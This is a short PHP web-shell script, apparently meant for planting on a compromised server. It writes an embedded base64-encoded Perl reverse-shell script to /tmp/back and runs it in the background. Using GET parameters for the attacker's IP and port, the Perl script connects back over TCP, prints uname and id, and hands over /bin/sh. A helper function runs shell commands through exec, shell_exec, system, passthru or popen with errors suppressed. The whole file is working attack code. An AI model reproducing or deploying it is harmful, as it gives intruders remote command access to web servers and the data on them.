<?php
function cf($fname,$text) 
{ 
 $w_file=@fopen($fname,"w") or err(0); 
 @fputs($w_file,@base64_decode($text)); 
 @fclose($w_file); 
} 


function ex($cfe) 
{ 
 $res = ''; 
  if(function_exists('exec')) 
   { 
    @exec($cfe,$res); 
    $res = join("\n",$res); 
   } 
  elseif(function_exists('shell_exec')) 
   { 
    $res = @shell_exec($cfe); 
   } 
  elseif(function_exists('system')) 
   { 
    @ob_start(); 
    @system($cfe); 
    $res = @ob_get_contents(); 
    @ob_end_clean(); 
   } 
  elseif(function_exists('passthru')) 
   { 
    @ob_start(); 
    @passthru($cfe); 
    $res = @ob_get_contents(); 
    @ob_end_clean(); 
   } 
  elseif(@is_resource($f = @popen($cfe,"r"))) 
  { 
   $res = ""; 
   while(!@feof($f)) { $res .= @fread($f,1024); } 
   @pclose($f); 
  } 
  
 return $res; 
} 


function which($pr) 
{ 
	$path = ex("which $pr"); 
	return $path;
}

$back_connect="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJHN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2Vj 
aG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHR 
hcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3J0LCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKT 
sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoI 
kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQi 
KTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNUREl 
OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw=="; 

cf("/tmp/back",$back_connect); 
$p2 = which("perl"); 
$blah = ex($p2." /tmp/back ".$_GET['ipi']." ".$_GET['pipi']." &");  
?>